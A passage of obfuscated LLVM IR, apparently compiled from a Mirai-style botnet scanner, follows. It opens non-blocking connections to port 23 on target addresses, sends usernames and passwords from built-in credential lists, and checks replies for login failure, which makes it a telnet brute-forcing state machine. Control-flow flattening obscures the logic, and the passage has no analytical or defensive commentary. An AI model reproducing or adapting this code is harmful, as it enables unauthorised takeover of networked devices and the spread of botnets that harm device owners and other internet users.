  %181 = zext i8 %180 to i64
  %182 = icmp eq i64 %181, 99
  %183 = select i1 %182, i32 736110605, i32 1695857728
  store i32 %183, i32* %switchVar
  br label %loopEnd

; <label>:184:                                    ; preds = %loopEntry
  %185 = load i32, i32* %5, align 4
  %186 = sext i32 %185 to i64
  %.reload116 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %187 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload116, i64 %186
  %188 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %187, i32 0, i32 3
  store i8 1, i8* %188, align 1
  store i32 391116288, i32* %switchVar
  br label %loopEnd

; <label>:189:                                    ; preds = %loopEntry
  store i32 1960540496, i32* %switchVar
  br label %loopEnd

; <label>:190:                                    ; preds = %loopEntry
  store i32 869257002, i32* %switchVar
  br label %loopEnd

; <label>:191:                                    ; preds = %loopEntry
  %192 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  store i16 2, i16* %192, align 4
  %193 = call zeroext i16 @htons(i16 zeroext 23) #13
  %194 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i16 %193, i16* %194, align 2
  %195 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 3
  %196 = getelementptr inbounds [8 x i8], [8 x i8]* %195, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %196, i8 0, i64 8, i32 4, i1 false)
  %197 = load i32, i32* %5, align 4
  %198 = sext i32 %197 to i64
  %.reload115 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %199 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload115, i64 %198
  %200 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %199, i32 0, i32 1
  %201 = load i32, i32* %200, align 4
  %202 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 2
  %203 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %202, i32 0, i32 0
  store i32 %201, i32* %203, align 4
  %204 = call i32 @socket(i32 2, i32 1, i32 0) #2
  %205 = load i32, i32* %5, align 4
  %206 = sext i32 %205 to i64
  %.reload114 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %207 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload114, i64 %206
  %208 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %207, i32 0, i32 0
  store i32 %204, i32* %208, align 16
  %209 = load i32, i32* %5, align 4
  %210 = sext i32 %209 to i64
  %.reload113 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %211 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload113, i64 %210
  %212 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %211, i32 0, i32 0
  %213 = load i32, i32* %212, align 16
  %214 = icmp eq i32 %213, -1
  %215 = select i1 %214, i32 -1539599590, i32 -1300972246
  store i32 %215, i32* %switchVar
  br label %loopEnd

; <label>:216:                                    ; preds = %loopEntry
  store i32 391116288, i32* %switchVar
  br label %loopEnd

; <label>:217:                                    ; preds = %loopEntry
  %218 = load i32, i32* %5, align 4
  %219 = sext i32 %218 to i64
  %.reload112 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %220 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload112, i64 %219
  %221 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %220, i32 0, i32 0
  %222 = load i32, i32* %221, align 16
  %223 = load i32, i32* %5, align 4
  %224 = sext i32 %223 to i64
  %.reload111 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %225 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload111, i64 %224
  %226 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %225, i32 0, i32 0
  %227 = load i32, i32* %226, align 16
  %228 = call i32 (i32, i32, ...) @fcntl(i32 %227, i32 3, i8* null)
  %229 = or i32 %228, 2048
  %230 = call i32 (i32, i32, ...) @fcntl(i32 %222, i32 4, i32 %229)
  %231 = load i32, i32* %5, align 4
  %232 = sext i32 %231 to i64
  %.reload110 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %233 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload110, i64 %232
  %234 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %233, i32 0, i32 0
  %235 = load i32, i32* %234, align 16
  %236 = bitcast %union.__CONST_SOCKADDR_ARG* %21 to %struct.sockaddr**
  %237 = bitcast %struct.sockaddr_in* %18 to %struct.sockaddr*
  store %struct.sockaddr* %237, %struct.sockaddr** %236, align 8
  %238 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %21, i32 0, i32 0
  %239 = load %struct.sockaddr*, %struct.sockaddr** %238, align 8
  %240 = call i32 @connect(i32 %235, %struct.sockaddr* %239, i32 16)
  %241 = icmp eq i32 %240, -1
  %242 = select i1 %241, i32 -1284021409, i32 -354151126
  store i32 %242, i32* %switchVar
  br label %loopEnd

; <label>:243:                                    ; preds = %loopEntry
  %244 = call i32* @__errno_location() #13
  %245 = load i32, i32* %244, align 4
  %246 = icmp ne i32 %245, 115
  %247 = select i1 %246, i32 -1488730241, i32 -354151126
  store i32 %247, i32* %switchVar
  br label %loopEnd

; <label>:248:                                    ; preds = %loopEntry
  %249 = load i32, i32* %5, align 4
  %250 = sext i32 %249 to i64
  %.reload109 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %251 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload109, i64 %250
  call void @reset_telstate(%struct.telstate_t* %251)
  store i32 663248794, i32* %switchVar
  br label %loopEnd

; <label>:252:                                    ; preds = %loopEntry
  %253 = load i32, i32* %5, align 4
  %254 = sext i32 %253 to i64
  %.reload108 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %255 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload108, i64 %254
  call void @advance_telstate(%struct.telstate_t* %255, i32 1)
  store i32 663248794, i32* %switchVar
  br label %loopEnd

; <label>:256:                                    ; preds = %loopEntry
  store i32 1209094734, i32* %switchVar
  br label %loopEnd

; <label>:257:                                    ; preds = %loopEntry
  store i32 -1541962035, i32* %switchVar
  br label %loopEnd

; <label>:258:                                    ; preds = %loopEntry
  %259 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %12, i32 0, i32 0
  %260 = getelementptr inbounds [16 x i64], [16 x i64]* %259, i64 0, i64 0
  %261 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %260) #2, !srcloc !6
  %262 = extractvalue { i64, i64* } %261, 0
  %263 = extractvalue { i64, i64* } %261, 1
  %264 = trunc i64 %262 to i32
  store i32 %264, i32* %22, align 4
  %265 = ptrtoint i64* %263 to i64
  %266 = trunc i64 %265 to i32
  store i32 %266, i32* %23, align 4
  store i32 -1806571743, i32* %switchVar
  br label %loopEnd

; <label>:267:                                    ; preds = %loopEntry
  store i32 -558173949, i32* %switchVar
  br label %loopEnd

; <label>:268:                                    ; preds = %loopEntry
  %269 = load i32, i32* %5, align 4
  %270 = sext i32 %269 to i64
  %.reload107 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %271 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload107, i64 %270
  %272 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %271, i32 0, i32 0
  %273 = load i32, i32* %272, align 16
  %274 = srem i32 %273, 64
  %275 = zext i32 %274 to i64
  %276 = shl i64 1, %275
  %277 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %12, i32 0, i32 0
  %278 = load i32, i32* %5, align 4
  %279 = sext i32 %278 to i64
  %.reload106 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %280 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload106, i64 %279
  %281 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %280, i32 0, i32 0
  %282 = load i32, i32* %281, align 16
  %283 = sdiv i32 %282, 64
  %284 = sext i32 %283 to i64
  %285 = getelementptr inbounds [16 x i64], [16 x i64]* %277, i64 0, i64 %284
  %286 = load i64, i64* %285, align 8
  %287 = or i64 %286, %276
  store i64 %287, i64* %285, align 8
  %288 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 0
  store i64 0, i64* %288, align 8
  %289 = load i32, i32* %3, align 4
  %290 = sext i32 %289 to i64
  %291 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 1
  store i64 %290, i64* %291, align 8
  %292 = load i32, i32* %5, align 4
  %293 = sext i32 %292 to i64
  %.reload105 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %294 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload105, i64 %293
  %295 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %294, i32 0, i32 0
  %296 = load i32, i32* %295, align 16
  %297 = add nsw i32 %296, 1
  %298 = call i32 @select(i32 %297, %struct.__sigset_t* null, %struct.__sigset_t* %12, %struct.__sigset_t* null, %struct.timeval* %13)
  store i32 %298, i32* %6, align 4
  %299 = load i32, i32* %6, align 4
  %300 = icmp eq i32 %299, 1
  %301 = select i1 %300, i32 788129844, i32 -1822102817
  store i32 %301, i32* %switchVar
  br label %loopEnd

; <label>:302:                                    ; preds = %loopEntry
  store i32 4, i32* %14, align 4
  store i32 0, i32* %15, align 4
  %303 = load i32, i32* %5, align 4
  %304 = sext i32 %303 to i64
  %.reload104 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %305 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload104, i64 %304
  %306 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %305, i32 0, i32 0
  %307 = load i32, i32* %306, align 16
  %308 = bitcast i32* %15 to i8*
  %309 = call i32 @getsockopt(i32 %307, i32 1, i32 4, i8* %308, i32* %14) #2
  %310 = load i32, i32* %15, align 4
  %311 = icmp ne i32 %310, 0
  %312 = select i1 %311, i32 -2049969668, i32 -688939774
  store i32 %312, i32* %switchVar
  br label %loopEnd

; <label>:313:                                    ; preds = %loopEntry
  %314 = load i32, i32* %5, align 4
  %315 = sext i32 %314 to i64
  %.reload103 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %316 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload103, i64 %315
  call void @reset_telstate(%struct.telstate_t* %316)
  store i32 -1708509544, i32* %switchVar
  br label %loopEnd

; <label>:317:                                    ; preds = %loopEntry
  %318 = load i32, i32* %5, align 4
  %319 = sext i32 %318 to i64
  %.reload102 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %320 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload102, i64 %319
  %321 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %320, i32 0, i32 0
  %322 = load i32, i32* %321, align 16
  %323 = load i32, i32* %5, align 4
  %324 = sext i32 %323 to i64
  %.reload101 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %325 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload101, i64 %324
  %326 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %325, i32 0, i32 0
  %327 = load i32, i32* %326, align 16
  %328 = call i32 (i32, i32, ...) @fcntl(i32 %327, i32 3, i8* null)
  %329 = and i32 %328, -2049
  %330 = call i32 (i32, i32, ...) @fcntl(i32 %322, i32 4, i32 %329)
  %331 = load i32, i32* %5, align 4
  %332 = sext i32 %331 to i64
  %.reload100 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %333 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload100, i64 %332
  call void @advance_telstate(%struct.telstate_t* %333, i32 2)
  store i32 -1708509544, i32* %switchVar
  br label %loopEnd

; <label>:334:                                    ; preds = %loopEntry
  store i32 391116288, i32* %switchVar
  br label %loopEnd

; <label>:335:                                    ; preds = %loopEntry
  %336 = load i32, i32* %6, align 4
  %337 = icmp eq i32 %336, -1
  %338 = select i1 %337, i32 -589790762, i32 800295249
  store i32 %338, i32* %switchVar
  br label %loopEnd

; <label>:339:                                    ; preds = %loopEntry
  %340 = load i32, i32* %5, align 4
  %341 = sext i32 %340 to i64
  %.reload99 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %342 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload99, i64 %341
  call void @reset_telstate(%struct.telstate_t* %342)
  store i32 391116288, i32* %switchVar
  br label %loopEnd

; <label>:343:                                    ; preds = %loopEntry
  store i32 -270694748, i32* %switchVar
  br label %loopEnd

; <label>:344:                                    ; preds = %loopEntry
  %345 = load i32, i32* %5, align 4
  %346 = sext i32 %345 to i64
  %.reload98 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %347 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload98, i64 %346
  %348 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %347, i32 0, i32 7
  %349 = load i32, i32* %348, align 16
  %350 = add i32 %349, 5
  %351 = zext i32 %350 to i64
  %352 = call i64 @time(i64* null) #2
  %353 = icmp slt i64 %351, %352
  %354 = select i1 %353, i32 1744193476, i32 -1885170550
  store i32 %354, i32* %switchVar
  br label %loopEnd

; <label>:355:                                    ; preds = %loopEntry
  %356 = load i32, i32* %5, align 4
  %357 = sext i32 %356 to i64
  %.reload97 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %358 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload97, i64 %357
  call void @reset_telstate(%struct.telstate_t* %358)
  store i32 -1885170550, i32* %switchVar
  br label %loopEnd

; <label>:359:                                    ; preds = %loopEntry
  store i32 1209094734, i32* %switchVar
  br label %loopEnd

; <label>:360:                                    ; preds = %loopEntry
  %361 = load i32, i32* %5, align 4
  %362 = sext i32 %361 to i64
  %.reload96 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %363 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload96, i64 %362
  %364 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %363, i32 0, i32 0
  %365 = load i32, i32* %364, align 16
  %366 = load i32, i32* %3, align 4
  %367 = load i32, i32* %5, align 4
  %368 = sext i32 %367 to i64
  %.reload95 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %369 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload95, i64 %368
  %370 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %369, i32 0, i32 9
  %371 = load i8*, i8** %370, align 8
  %372 = call i32 @read_until_response(i32 %365, i32 %366, i8* %371, i32 1024, i8** getelementptr inbounds ([7 x i8*], [7 x i8*]* @advances, i32 0, i32 0))
  %373 = icmp ne i32 %372, 0
  %374 = select i1 %373, i32 -655633967, i32 357410707
  store i32 %374, i32* %switchVar
  br label %loopEnd

; <label>:375:                                    ; preds = %loopEntry
  %376 = load i32, i32* %5, align 4
  %377 = sext i32 %376 to i64
  %.reload94 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %378 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload94, i64 %377
  %379 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %378, i32 0, i32 9
  %380 = load i8*, i8** %379, align 8
  %381 = call i32 @contains_fail(i8* %380)
  %382 = icmp ne i32 %381, 0
  %383 = select i1 %382, i32 1232798284, i32 -782132112
  store i32 %383, i32* %switchVar
  br label %loopEnd

; <label>:384:                                    ; preds = %loopEntry
  %385 = load i32, i32* %5, align 4
  %386 = sext i32 %385 to i64
  %.reload93 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %387 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload93, i64 %386
  call void @advance_telstate(%struct.telstate_t* %387, i32 0)
  store i32 -550747665, i32* %switchVar
  br label %loopEnd

; <label>:388:                                    ; preds = %loopEntry
  %389 = load i32, i32* %5, align 4
  %390 = sext i32 %389 to i64
  %.reload92 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %391 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload92, i64 %390
  call void @advance_telstate(%struct.telstate_t* %391, i32 3)
  store i32 -550747665, i32* %switchVar
  br label %loopEnd

; <label>:392:                                    ; preds = %loopEntry
  store i32 391116288, i32* %switchVar
  br label %loopEnd

; <label>:393:                                    ; preds = %loopEntry
  %394 = load i32, i32* %5, align 4
  %395 = sext i32 %394 to i64
  %.reload91 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %396 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload91, i64 %395
  %397 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %396, i32 0, i32 7
  %398 = load i32, i32* %397, align 16
  %399 = add i32 %398, 7
  %400 = zext i32 %399 to i64
  %401 = call i64 @time(i64* null) #2
  %402 = icmp slt i64 %400, %401
  %403 = select i1 %402, i32 1455514376, i32 -317135080
  store i32 %403, i32* %switchVar
  br label %loopEnd

; <label>:404:                                    ; preds = %loopEntry
  %405 = load i32, i32* %5, align 4
  %406 = sext i32 %405 to i64
  %.reload90 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %407 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload90, i64 %406
  call void @reset_telstate(%struct.telstate_t* %407)
  store i32 -317135080, i32* %switchVar
  br label %loopEnd

; <label>:408:                                    ; preds = %loopEntry
  store i32 1209094734, i32* %switchVar
  br label %loopEnd

; <label>:409:                                    ; preds = %loopEntry
  %410 = load i32, i32* %5, align 4
  %411 = sext i32 %410 to i64
  %.reload89 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %412 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload89, i64 %411
  %413 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %412, i32 0, i32 0
  %414 = load i32, i32* %413, align 16
  %415 = load i32, i32* %5, align 4
  %416 = sext i32 %415 to i64
  %.reload88 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %417 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload88, i64 %416
  %418 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %417, i32 0, i32 4
  %419 = load i8, i8* %418, align 2
  %420 = zext i8 %419 to i64
  %421 = getelementptr inbounds [99 x i8*], [99 x i8*]* @usernames, i64 0, i64 %420
  %422 = load i8*, i8** %421, align 8
  %423 = load i32, i32* %5, align 4
  %424 = sext i32 %423 to i64
  %.reload87 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %425 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload87, i64 %424
  %426 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %425, i32 0, i32 4
  %427 = load i8, i8* %426, align 2
  %428 = zext i8 %427 to i64
  %429 = getelementptr inbounds [99 x i8*], [99 x i8*]* @usernames, i64 0, i64 %428
  %430 = load i8*, i8** %429, align 8
  %431 = call i64 @strlen(i8* %430) #10
  %432 = call i64 @send(i32 %414, i8* %422, i64 %431, i32 16384)
  %433 = icmp slt i64 %432, 0
  %434 = select i1 %433, i32 1500334244, i32 424685328
  store i32 %434, i32* %switchVar
  br label %loopEnd

; <label>:435:                                    ; preds = %loopEntry
  %436 = load i32, i32* %5, align 4
  %437 = sext i32 %436 to i64
  %.reload86 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %438 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload86, i64 %437
  call void @reset_telstate(%struct.telstate_t* %438)
  store i32 391116288, i32* %switchVar
  br label %loopEnd

; <label>:439:                                    ; preds = %loopEntry
  %440 = load i32, i32* %5, align 4
  %441 = sext i32 %440 to i64
  %.reload85 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %442 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload85, i64 %441
  %443 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %442, i32 0, i32 0
  %444 = load i32, i32* %443, align 16
  %445 = call i64 @send(i32 %444, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.314, i32 0, i32 0), i64 2, i32 16384)
  %446 = icmp slt i64 %445, 0
  %447 = select i1 %446, i32 -1468106892, i32 -1244624368
  store i32 %447, i32* %switchVar
  br label %loopEnd

; <label>:448:                                    ; preds = %loopEntry
  %449 = load i32, i32* %5, align 4
  %450 = sext i32 %449 to i64
  %.reload84 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %451 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload84, i64 %450
  call void @reset_telstate(%struct.telstate_t* %451)
  store i32 391116288, i32* %switchVar
  br label %loopEnd

; <label>:452:                                    ; preds = %loopEntry
  %453 = load i32, i32* %5, align 4
  %454 = sext i32 %453 to i64
  %.reload83 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %455 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload83, i64 %454
  call void @advance_telstate(%struct.telstate_t* %455, i32 4)
  store i32 1209094734, i32* %switchVar
  br label %loopEnd

; <label>:456:                                    ; preds = %loopEntry
  %457 = load i32, i32* %5, align 4
  %458 = sext i32 %457 to i64
  %.reload82 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %459 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload82, i64 %458
  %460 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %459, i32 0, i32 0
  %461 = load i32, i32* %460, align 16
  %462 = load i32, i32* %3, align 4
  %463 = load i32, i32* %5, align 4
  %464 = sext i32 %463 to i64
  %.reload81 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %465 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload81, i64 %464
  %466 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %465, i32 0, i32 9
  %467 = load i8*, i8** %466, align 8
  %468 = call i32 @read_until_response(i32 %461, i32 %462, i8* %467, i32 1024, i8** getelementptr inbounds ([7 x i8*], [7 x i8*]* @advances, i32 0, i32 0))
  %469 = icmp ne i32 %468, 0
  %470 = select i1 %469, i32 -1192298861, i32 1889443114
  store i32 %470, i32* %switchVar
  br label %loopEnd

; <label>:471:                                    ; preds = %loopEntry
  %472 = load i32, i32* %5, align 4
  %473 = sext i32 %472 to i64
  %.reload80 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %474 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload80, i64 %473
  %475 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %474, i32 0, i32 9
  %476 = load i8*, i8** %475, align 8
  %477 = call i32 @contains_fail(i8* %476)
  %478 = icmp ne i32 %477, 0
  %479 = select i1 %478, i32 -109226799, i32 1880168055
  store i32 %479, i32* %switchVar
  br label %loopEnd

; <label>:480:                                    ; preds = %loopEntry
  %481 = load i32, i32* %5, align 4
  %482 = sext i32 %481 to i64
  %.reload79 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %483 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload79, i64 %482
  call void @advance_telstate(%struct.telstate_t* %483, i32 0)
  store i32 1088266242, i32* %switchVar
  br label %loopEnd

; <label>:484:                                    ; preds = %loopEntry
  %485 = load i32, i32* %5, align 4
  %486 = sext i32 %485 to i64
  %.reload78 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %487 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload78, i64 %486
  call void @advance_telstate(%struct.telstate_t* %487, i32 5)
  store i32 1088266242, i32* %switchVar
  br label %loopEnd

; <label>:488:                                    ; preds = %loopEntry
  store i32 391116288, i32* %switchVar
  br label %loopEnd

; <label>:489:                                    ; preds = %loopEntry
  %490 = load i32, i32* %5, align 4
  %491 = sext i32 %490 to i64
  %.reload77 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %492 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload77, i64 %491
  %493 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %492, i32 0, i32 7
  %494 = load i32, i32* %493, align 16
  %495 = add i32 %494, 3
  %496 = zext i32 %495 to i64
  %497 = call i64 @time(i64* null) #2
  %498 = icmp slt i64 %496, %497
  %499 = select i1 %498, i32 1539010158, i32 -1892949977
  store i32 %499, i32* %switchVar
  br label %loopEnd

; <label>:500:                                    ; preds = %loopEntry
  %501 = load i32, i32* %5, align 4
  %502 = sext i32 %501 to i64
  %.reload76 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %503 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload76, i64 %502
  call void @reset_telstate(%struct.telstate_t* %503)
  store i32 -1892949977, i32* %switchVar
  br label %loopEnd

; <label>:504:                                    ; preds = %loopEntry
  store i32 1209094734, i32* %switchVar
  br label %loopEnd

; <label>:505:                                    ; preds = %loopEntry
  %506 = load i32, i32* %5, align 4
  %507 = sext i32 %506 to i64
  %.reload75 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %508 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload75, i64 %507
  %509 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %508, i32 0, i32 0
  %510 = load i32, i32* %509, align 16
  %511 = load i32, i32* %5, align 4
  %512 = sext i32 %511 to i64
  %.reload74 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %513 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload74, i64 %512
  %514 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %513, i32 0, i32 5
  %515 = load i8, i8* %514, align 1
  %516 = zext i8 %515 to i64
  %517 = getelementptr inbounds [98 x i8*], [98 x i8*]* @passwords, i64 0, i64 %516
  %518 = load i8*, i8** %517, align 8
  %519 = load i32, i32* %5, align 4
  %520 = sext i32 %519 to i64
  %.reload73 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %521 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload73, i64 %520
  %522 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %521, i32 0, i32 5
  %523 = load i8, i8* %522, align 1
  %524 = zext i8 %523 to i64
  %525 = getelementptr inbounds [98 x i8*], [98 x i8*]* @passwords, i64 0, i64 %524
  %526 = load i8*, i8** %525, align 8
  %527 = call i64 @strlen(i8* %526) #10
  %528 = call i64 @send(i32 %510, i8* %518, i64 %527, i32 16384)
  %529 = icmp slt i64 %528, 0
  %530 = select i1 %529, i32 293336789, i32 785646434
  store i32 %530, i32* %switchVar
  br label %loopEnd

; <label>:531:                                    ; preds = %loopEntry
  %532 = load i32, i32* %5, align 4
  %533 = sext i32 %532 to i64
  %.reload72 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %534 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload72, i64 %533
  call void @reset_telstate(%struct.telstate_t* %534)
  store i32 391116288, i32* %switchVar
  br label %loopEnd

; <label>:535:                                    ; preds = %loopEntry
  %536 = load i32, i32* %5, align 4
  %537 = sext i32 %536 to i64
  %.reload71 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %538 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload71, i64 %537
  %539 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %538, i32 0, i32 0
  %540 = load i32, i32* %539, align 16
  %541 = call i64 @send(i32 %540, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.314, i32 0, i32 0), i64 2, i32 16384)
  %542 = icmp slt i64 %541, 0
  %543 = select i1 %542, i32 -735119696, i32 -61934395
  store i32 %543, i32* %switchVar
  br label %loopEnd

; <label>:544:                                    ; preds = %loopEntry
  %545 = load i32, i32* %5, align 4
  %546 = sext i32 %545 to i64
  %.reload70 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %547 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload70, i64 %546
  call void @reset_telstate(%struct.telstate_t* %547)
  store i32 391116288, i32* %switchVar
  br label %loopEnd

; <label>:548:                                    ; preds = %loopEntry
  %549 = load i32, i32* %5, align 4
  %550 = sext i32 %549 to i64
  %.reload69 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %551 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload69, i64 %550
  call void @advance_telstate(%struct.telstate_t* %551, i32 6)
  store i32 1209094734, i32* %switchVar
  br label %loopEnd

; <label>:552:                                    ; preds = %loopEntry
  %553 = load i32, i32* %5, align 4
  %554 = sext i32 %553 to i64
  %.reload68 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem16
  %555 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload68, i64 %554
  %556 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %555, i32 0, i32 0
  %557 = load i32, i32* %556, align 16
  %558 = load i32, i32* %3, align 4
